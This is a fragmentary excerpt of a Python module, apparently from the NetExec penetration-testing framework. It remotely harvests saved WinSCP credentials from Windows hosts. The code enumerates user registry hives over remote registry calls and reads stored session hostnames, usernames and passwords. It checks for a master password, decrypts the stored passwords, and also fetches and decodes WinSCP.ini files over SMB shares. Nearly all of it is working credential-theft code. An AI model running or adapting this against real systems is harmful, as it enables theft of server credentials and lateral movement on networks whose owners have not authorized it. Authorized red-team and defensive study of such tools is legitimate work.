...
class NXCModule:
    ...
    def user_object_to_name_mapper(self, context, connection, all_user_objects):
        try:
            ...
            reg_handle = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)[
                "phKey"
            ]
            ...
            for user_object in all_user_objects:
                ...
                user_profile_path = rrp.hBaseRegQueryValue(
                    remote_ops._RemoteOperations__rrp, key_handle, "ProfileImagePath"
                )[1].split("\x00")[:-1][0]
    ...
    def registry_session_extractor(self, context, connection, user_object, sessionName):
        ...
        try:
            ...
            key_handle = rrp.hBaseRegOpenKey(
                remote_ops._RemoteOperations__rrp,
                reg_handle,
                f"{user_object}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\{sessionName}",
            )["phkResult"]
            host_name = unquote(
                rrp.hBaseRegQueryValue(
                    remote_ops._RemoteOperations__rrp, key_handle, "HostName"
                )[1].split("\x00")[:-1][0]
            )
            user_name = rrp.hBaseRegQueryValue(
                remote_ops._RemoteOperations__rrp, key_handle, "UserName"
            )[1].split("\x00")[:-1][0]
            try:
                password = rrp.hBaseRegQueryValue(
                    remote_ops._RemoteOperations__rrp, key_handle, "Password"
                )[1].split("\x00")[:-1][0]
            except Exception:
            ...
            dec_password = (
                self.decrypt_passwd(host_name, user_name, password)
                if password
    ...
    def find_all_logged_in_users_in_registry(self, context, connection):
        ...
        try:
            ...
            reg_handle = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp)["phKey"]
            key_handle = rrp.hBaseRegOpenKey(
                remote_ops._RemoteOperations__rrp, reg_handle, ""
            )["phkResult"]
            users = rrp.hBaseRegQueryInfoKey(
                remote_ops._RemoteOperations__rrp, key_handle
            )["lpcSubKeys"]

            # Get User Names
            user_names = [
                rrp.hBaseRegEnumKey(remote_ops._RemoteOperations__rrp, key_handle, i)[
                    "lpNameOut"
                ].split("\x00")[:-1][0]
            ...
            for user_object in unloaded_user_objects:
                ...
                try:
                    rrp.hBaseRegUnLoadKey(
                        remote_ops._RemoteOperations__rrp, key_handle, user_object
                    )
                except Exception as e:
                    context.log.fail(
    ...
    def check_masterpassword_set(self, context, connection, user_object):
        ...
        try:
            ...
            key_handle = rrp.hBaseRegOpenKey(
                remote_ops._RemoteOperations__rrp,
                reg_handle,
                f"{user_object}\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security",
            )["phkResult"]
            use_master_password = rrp.hBaseRegQueryValue(
                remote_ops._RemoteOperations__rrp, key_handle, "UseMasterPassword"
            )[1]
            rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
        except DCERPCException as e:
            if str(e).find("ERROR_FILE_NOT_FOUND"):
                context.log.debug(
                    "Security configuration registry not found, no master passwords set at all."
                )
            else:
    ...
    def registry_discover(self, context, connection):
        ...
        try:
            ...
            # Enumerate all Users on System
            user_objects = self.find_all_logged_in_users_in_registry(
                context, connection
            )
            ...
            unloaded_user_objects = list(
                set(user_objects).symmetric_difference(set(all_user_objects))
            )
            ...
            for user_object in all_user_objects:
                try:
                    key_handle = rrp.hBaseRegOpenKey(
                        remote_ops._RemoteOperations__rrp,
                        reg_handle,
                        f"{user_object}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions",
                    )["phkResult"]
                    sessions = rrp.hBaseRegQueryInfoKey(
                        remote_ops._RemoteOperations__rrp, key_handle
                    )["lpcSubKeys"]
                    context.log.success(
                        f'Found {sessions - 1} sessions for user "{self.userDict[user_object]}" in registry!'
                    )

                    # Get Session Names
                    session_names = [
                        rrp.hBaseRegEnumKey(
                            remote_ops._RemoteOperations__rrp, key_handle, i
                        )["lpNameOut"].split("\x00")[:-1][0]
                    ...
                    for sessionName in session_names:
                        self.print_creds(
                            context,
                            self.registry_session_extractor(
                                context, connection, user_object, sessionName
                            ),
                        )
                except DCERPCException as e:
                    if str(e).find("ERROR_FILE_NOT_FOUND"):
                        context.log.debug(
                            f"No WinSCP config found in registry for user {user_object}"
                        )
                except Exception as e:
            ...
            if str(e).find("rpc_s_access_denied"):
                context.log.fail(
                    "Error: rpc_s_access_denied. Seems like you don't have enough privileges to read the registry."
                )
        except Exception as e:
            context.log.fail(f"UNEXPECTED ERROR: {e}")
            context.log.debug(traceback.format_exc())
        ...
        for section in config.sections():
            if config.has_option(section, "HostName"):
                ...
                if config.has_option(section, "Password"):
                    ...
                    dec_password = self.decrypt_passwd(
                        host_name, user_name, enc_password
                    )
                else:
                    dec_password = "NO_PASSWORD_FOUND"
                section_name = unquote(section)
                self.print_creds(
                    context, [section_name, host_name, user_name, dec_password]
                )
    ...
    def get_config_file(self, context, connection):
        if self.filepath:
            ...
            context.log.display(
                "Looking for WinSCP creds in User documents and AppData..."
            )
            users = []
            ...
            for user in users:
                ...
                for path in paths:
                    ...
                    try:
                        ...
                        conf_file = buf.getvalue().decode()
                        context.log.success(
                            f"Found config file at '{self.share + path}'! Extracting credentials..."
                        )
                    except SessionError as e:
                        context.log.debug(
                            f"No config file found at '{self.share + path}': {e}"
                        )
                    except Exception as e:
                        context.log.fail(
                            f"Error getting config file at '{self.share + path}': {e}"
                        )
                        context.log.debug(traceback.format_exc())
                    else:
                        self.decode_config_file(context, conf_file)
